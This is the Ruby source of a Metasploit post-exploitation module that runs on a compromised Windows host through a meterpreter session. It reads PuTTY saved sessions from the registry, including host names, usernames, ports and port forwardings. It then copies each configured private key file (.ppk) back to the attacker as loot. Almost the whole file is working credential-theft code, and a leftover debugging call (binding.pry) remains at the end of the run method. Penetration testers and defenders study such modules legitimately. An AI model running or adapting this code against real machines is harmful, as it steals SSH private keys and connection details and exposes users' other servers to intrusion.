##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/post/windows/priv'
require 'msf/core/post/common'
require 'msf/core/post/windows/registry'

class Metasploit3 < Msf::Post
  include Msf::Post::Windows::Priv
  include Msf::Post::Common
  include Msf::Post::File
  include Msf::Post::Windows::Registry

  INTERESTING_KEYS=['HostName','PublicKeyFile','UserName','PortNumber','PortForwardings']
  def initialize(info={})
    super(update_info(info,
      'Name'            => "PuTTY Saved Sessions Enumeration Module",
      'Description'     => %q{
        This module will identify whether Pageant (PuTTY Agent) is running and obtain saved session
        information from the registry. PuTTY is very configurable; some users may have configured
        saved sessions which could include a username, private key file to use when authenticating,
        host name etc.

        If a private key is configured, an attempt will be made to download and store it in loot.
        },
      'License'         => MSF_LICENSE,
      'Platform'        => ['win'],
      'SessionTypes'    => ['meterpreter'],
      'Author'          => ['Stuart Morgan <stuart.morgan[at]mwrinfosecurity.com>']
    ))
  end

  def get_saved_session_details(sessions)

    all_sessions = []
    sessions.each do |ses|
        newses = {}
        newses['Name'] = Rex::Text.uri_decode(ses)
        INTERESTING_KEYS.each do |key|
            newses[key] = registry_getvaldata("HKCU\\Software\\SimonTatham\\PuTTY\\Sessions\\#{ses}", key).to_s
        end
        all_sessions << newses
    end 
    all_sessions
  end

  def display_saved_sessions_report(info)

    # Results table holds raw string data
    results_table = Rex::Ui::Text::Table.new(
      'Header'     => "PuTTY Saved Sessions",
      'Indent'     => 1,
      'SortIndex'  => -1,
      'Columns'    => ['Name'].append(INTERESTING_KEYS).flatten
    )

    info.each do |result|
      row = []
      row << result['Name']
      INTERESTING_KEYS.each do |key|
        row << result[key]
      end  
      results_table << row
    end

    print_line results_table.to_s
    #stored_path = store_loot('ad.computers', 'text/plain', session, results_table.to_csv)
    #print_status("Results saved to: #{stored_path}")
  end

  def grab_private_keys(sessions)
    sessions.each do |ses|
        filename = ses['PublicKeyFile'].to_s
        next if filename.empty?

        if file?(filename)
           ppk = read_file(filename) 
           stored_path = store_loot('putty.ppk.file', 'text/plain', session, ppk)
           print_status("PuTTY private key file for \'#{ses['Name']}\' (#{filename}) saved to: #{stored_path}")
        else
           print_error("PuTTY private key file for \'#{ses['Name']}\' (#{filename}) could not be found.")
        end
    end
  end

  # The sauce starts here
  def run

    # Look for saved sessions, break out if not.
    saved_sessions = registry_enumkeys('HKCU\\Software\\SimonTatham\\PuTTY\\Sessions')
    if saved_sessions.nil? || saved_sessions.empty?
        print_error('No saved sessions found')
        return
    end

    # Tell the user how many sessions have been found (with correct English)
    print_status("Found #{saved_sessions.count} session#{saved_sessions.count>1?'s':''}") 

    # Retrieve the saved session details & print them to the screen in a report
    all_saved_sessions = get_saved_session_details(saved_sessions)
    display_saved_sessions_report(all_saved_sessions)

    # If the private key file has been configured, retrieve it and save it to loot
    print_status("Downloading private keys...")
    grab_private_keys(all_saved_sessions)

    binding.pry

  end
end
